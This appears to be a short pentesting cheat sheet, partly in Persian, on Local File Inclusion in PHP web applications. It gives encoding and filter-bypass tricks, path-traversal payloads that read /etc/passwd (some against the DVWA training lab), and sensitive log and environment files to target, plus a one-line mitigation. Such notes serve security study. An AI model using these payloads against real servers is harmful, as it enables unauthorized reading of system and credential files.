# Local File Inclusion

## Concept
- از این آسیب پذیری  برای خواند فایل های تنظیمات روی hosting machine استفاده می شود
- همچنین فایل های تصادفی مانند /etc/passwd
- همچنین ممکن است منجر به Information Disclosure شود
- در LFI می توانیم فایل اجرا کنیم ولی در Directory Traversal فقط می توانیم فایل های روی سرور را بخوانیم

## Bypass
- Encoding
  - ```.``` => %2e
  - ```/``` => %2f
  - ```../``` => %2e%2e%2f
- WAF Bypass
  - ```../``` => ```..././``` 
  - ```../``` => ```....//``` 

## Exploit
  - ```example1.php?page=intro.php../../../../../etc/passwd```
  - ```example2.php?page=intro../../../../../../../../../../etc/passwd%00``` 
  - ```example2.php?page=intro%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00``` 
  - ```localhost/dvwa/vulnerabilities/fi/?page=..././..././phpinfo.php```
  - ```localhost/dvwa/vulnerabilities/fi/?page=file:////opt/lampp/htdocs/dvwa/phpinfo.php```

## Intersting files
  - ```/proc/self/environ```
  - ```/var/log/auth.log```
  - ```/var/log/apache2/access.log```
  
## Mitigation
  - Use static file inclusion. hard code the fiels that we want to include in the code.
